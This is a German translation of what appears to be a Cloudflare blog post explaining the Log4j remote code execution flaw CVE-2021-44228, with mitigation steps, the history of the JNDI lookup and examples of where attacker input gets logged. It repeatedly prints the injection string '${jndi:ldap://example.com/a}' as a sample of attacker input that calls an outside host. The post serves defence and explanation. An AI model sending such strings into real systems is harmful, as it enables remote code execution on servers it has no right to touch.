<div class="post-content lh-copy gray1">
	<p><em>In früheren Versionen dieses Blogbeitrags wurden leicht abweichende Abwehrtechniken empfohlen. Das Apache Log4j-Projekt hat seine offizielle Anleitung aktualisiert und wir haben diesen Blogbeitrag entsprechend den Empfehlungen aktualisiert</em></p>
	<p>Gestern, am 9. Dezember 2021, wurde eine sehr schwerwiegende Sicherheitslücke in dem beliebten Java-basierten Protokollierungspaket <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228" target="_blank">Log4j</a> bekannt gegeben. Diese Sicherheitslücke ermöglicht es einem Angreifer, Code auf einem entfernten Server auszuführen; eine sogenannte Remote Code Execution (RCE). Aufgrund der weiten Verbreitung von Java und Log4j ist dies wahrscheinlich eine der schwerwiegendsten Sicherheitslücken im Internet seit <a href="https://blog.cloudflare.com/tag/heartbleed/">Heartbleed</a> und <a href="https://blog.cloudflare.com/inside-shellshock/">ShellShock</a>.</p>
	<p>Die Sicherheitslücke trägt die Bezeichnung <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228" target="_blank">CVE-2021-44228</a> und betrifft Version 2 von Log4j zwischen den Versionen 2.0-beta-9 und 2.14.1. In Version 2.16.0 ist sie gepatcht.</p>
	<p>In diesem Beitrag erklären wir die Geschichte dieser Schwachstelle, wie sie eingeführt wurde und wie Cloudflare unsere Kunden schützt. <a href="https://blog.cloudflare.com/de-de/actual-cve-2021-44228-payloads-captured-in-the-wild-de-de/">Details zu tatsächlichen Exploit-Versuchen </a>, die von unserem Firewall-Service blockiert werden, finden Sie in einem separaten Blogbeitrag.</p>
	<p>Cloudflare verwendet einige Java-basierte Software und unsere Teams haben daran gearbeitet, sicherzustellen, dass unsere Systeme nicht anfällig sind oder dass diese Sicherheitslücke entschärft wurde. Parallel dazu haben wir Firewall-Regeln zum Schutz unserer Kunden eingeführt.</p>
	<p>Wenn Sie jedoch für ein Unternehmen arbeiten, das Java-basierte Software einsetzt, die Log4j verwendet, sollten Sie sofort den Abschnitt über die Abwehrmaßnahmen und den Schutz Ihrer Systeme lesen, bevor Sie den Rest lesen.</p>
	<h3 id="wie-man-cve-2021-44228-abwendet">Wie man CVE-2021-44228 abwendet</h3>
	<p>Implementieren einer der folgenden Abwehrtechniken: &nbsp;Benutzer von Java 8 (oder höher) sollten ein Upgrade auf Version 2.16.0 durchführen. Benutzer von Java 7 sollten auf die Version 2.12.2 aktualisieren.</p>
	<p>Ansonsten können Sie in jeder Version außer 2.16.0 die Klasse JndiLookup entfernen aus dem classpath: <code>zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</code></p>
	<h3 id="geschichte-der-sicherheitsl-cke">Geschichte der Sicherheitslücke</h3>
	<p>Im Jahr 2013, in <a href="https://blogs.apache.org/logging/entry/apache_log4j_2_0_beta9" target="_blank">version 2.0-beta9</a>, fügte das Log4j-Paket das „JNDILookup-Plugin“ in Ausgabe <a href="https://issues.apache.org/jira/browse/LOG4J2-313" target="_blank">LOG4J2-313</a> hinzu. Um zu verstehen, wie diese Änderung zu einem Problem führt, ist es notwendig, das <a href="https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface" target="_blank">JNDI</a>, das Java Naming and Directory Interface, etwas genauer zu verstehen.</p>
	<p>JNDI ist seit den späten 1990er Jahren in Java enthalten. Es handelt sich um einen Verzeichnisdienst, der es einem Java-Programm ermöglicht, Daten (in Form eines Java-Objekts) über ein Verzeichnis zu finden. JNDI verfügt über eine Reihe von Service Provider Interfaces (SPIs), die es ermöglichen, eine Vielzahl von Verzeichnisdiensten zu nutzen.</p>
	<p>So gibt es beispielsweise SPIs für den CORBA COS (Common Object Service), das Java RMI (Remote Method Interface) Registry und LDAP. LDAP ist ein sehr beliebter Verzeichnisdienst (das Lightweight Directory Access Protocol) und steht im Mittelpunkt von CVE-2021-44228 (obwohl auch andere SPIs verwendet werden könnten).</p>
	<p>Ein Java-Programm kann JNDI und LDAP zusammen verwenden, um ein Java-Objekt zu finden, das Daten enthält, die es möglicherweise benötigt. In der Java-Standarddokumentation gibt es etwa ein <a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/examples/directory.html" target="_blank">Beispiel</a> , das mit einem LDAP-Server kommuniziert, um Attribute von einem Objekt abzurufen. Es verwendet die URL <code>ldap://localhost:389/o=JNDITutorial</code>, um das JNDITutorial-Objekt von einem LDAP-Server zu finden, der auf demselben Rechner (localhost) an Port 389 läuft, und liest dann Attribute daraus.</p>
	<p>In der Anleitung heißt es: „<em>Wenn sich Ihr LDAP-Server auf einem anderen Rechner befindet oder einen anderen Port verwendet, müssen Sie die LDAP-URL bearbeiten</em>“. Der LDAP-Server könnte sich also auf einem anderen Rechner und möglicherweise überall im Internet befinden. Diese Flexibilität bedeutet, dass ein Angreifer, der die LDAP-URL kontrollieren kann, ein Java-Programm dazu bringen kann, ein Objekt von einem Server unter seiner Kontrolle zu laden.</p>
	<p>Das sind die Grundlagen von JNDI und LDAP; ein nützlicher Teil des Java-Ökosystems.</p>
	<p>Im Falle von Log4j kann ein Angreifer jedoch die LDAP-URL kontrollieren, indem er Log4j veranlasst, eine Zeichenfolge wie <code>${jndi:ldap://example.com/a}</code> zu schreiben. In diesem Fall verbindet sich Log4j mit dem LDAP-Server unter example.com und ruft das Objekt ab.</p>
	<p>Das liegt daran, dass Log4j eine <a href="https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution" target="_blank">spezielle Syntax</a> in der Form ${prefix:name} enthält, wobei prefix eine von mehreren verschiedenen <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html" target="_blank">Lookups</a> ist, bei denen name ausgewertet werden soll. Zum Beispiel ist <code>${java:version}</code> die aktuell laufende Version von Java.</p>
	<p><a href="https://issues.apache.org/jira/browse/LOG4J2-313" target="_blank">LOG4J2-313</a> hat ein jndi-Lookup wie folgt hinzugefügt: „Mit JndiLookup können Variablen über JNDI abgerufen werden. Standardmäßig wird dem Schlüssel das Präfix java:comp/env/ vorangestellt. Wenn der Schlüssel jedoch ein „:“ enthält, wird kein Präfix hinzugefügt.“</p>
	<p>Mit einem : im Schlüssel, wie in <code>${jndi:ldap://example.com/a}</code> gibt es kein Präfix und der LDAP-Server wird nach dem Objekt abgefragt. Und diese Lookups können sowohl in der Konfiguration von Log4j als auch beim Loggen von Zeilen verwendet werden.</p>
	<p>Ein Angreifer muss also nur eine Eingabe finden, die protokolliert wird, und etwas wie <code>${jndi:ldap://example.com/a</code> hinzufügen. Dies könnte ein allgemeiner HTTP-Header wie User-Agent (der üblicherweise protokolliert wird) oder vielleicht ein Formularparameter wie username sein, der ebenfalls protokolliert werden könnte.</p>
	<p>Dies ist wahrscheinlich in Java-basierter Internet-Software, die Log4j verwendet, sehr verbreitet. Noch heimtückischer ist, dass Software, die nicht für das Internet bestimmt ist und Java verwendet, ebenfalls ausgenutzt werden kann, da die Daten von System zu System weitergegeben werden.</p>
	<p>Beispielsweise könnte eine User-Agent-Zeichenkette, die den Exploit enthält, an ein in Java geschriebenes Backend-System weitergeleitet werden, das Indizierung oder Data Science betreibt, und der Exploit könnte protokolliert werden. Aus diesem Grund ist es wichtig, dass alle Java-basierte Software, die Log4j Version 2 verwendet, sofort gepatcht oder durch Abwehrmaßnahmen geschützt wird. Selbst wenn die Internet-Software nicht in Java geschrieben ist, ist es möglich, dass Zeichenketten an andere Systeme weitergegeben werden, die in Java geschrieben sind, so dass der Missbrauch möglich ist.</p>
	<!--kg-card-begin: html--><img src="https://blog.cloudflare.com/content/images/2021/12/Exploit-activated.png">
	<!--kg-card-end: html-->
	<p>Oder stellen Sie sich ein Java-basiertes Abrechnungssystem vor, das protokolliert, wenn der Vorname des Kunden nicht gefunden wird. Ein böswilliger Benutzer könnte einen Auftrag mit einem Vornamen erstellen, der den Exploit enthält, und es könnte mehrere Sprünge (und viel Zeit) dauern, bis er vom Webserver über eine Kundendatenbank in das Abrechnungssystem gelangt, wo er schließlich ausgeführt wird.</p>
	<p>Und Java wird für viel mehr Systeme verwendet als nur für solche, die mit dem Internet verbunden sind. Es ist zum Beispiel nicht schwer, sich vorzustellen, dass ein Paketverarbeitungssystem, das QR-Codes auf Boxen scannt, oder ein kontaktloser Türschlüssel anfällig sind, wenn sie in Java geschrieben sind und Log4j verwenden. In dem einen Fall könnte ein sorgfältig gestalteter QR-Code eine Postadresse enthalten, die den Exploit-String enthält; im anderen Fall könnte ein sorgfältig programmierter Türschlüssel den Exploit enthalten und von einem System aufgezeichnet werden, das die Ein- und Ausgänge verfolgt.</p>
	<p>Und Systeme, die regelmäßig arbeiten, könnten die Sicherheitslücke aufspüren und später protokollieren. Der Exploit könnte also so lange schlummern, bis ein in Java geschriebener Indizierungs-, Rollup- oder Archivierungsprozess versehentlich die fehlerhafte Zeichenfolge protokolliert. Stunden oder sogar Tage später.</p>
	<h3 id="cloudflare-firewall-schutz">Cloudflare Firewall-Schutz</h3>
	<p>Cloudflare hat für unsere Kunden, die unsere Firewall verwenden, einen Schutz in Form von Regeln eingeführt, die den jndi Lookup an gängigen Stellen in einer HTTP-Anfrage blockieren. Dies ist im Detail <a href="https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation/">hier</a> beschrieben. Wir haben diese Regeln weiter verfeinert, da Angreifer ihre Exploits modifiziert haben, und werden dies auch weiterhin tun.<br></p>
</div>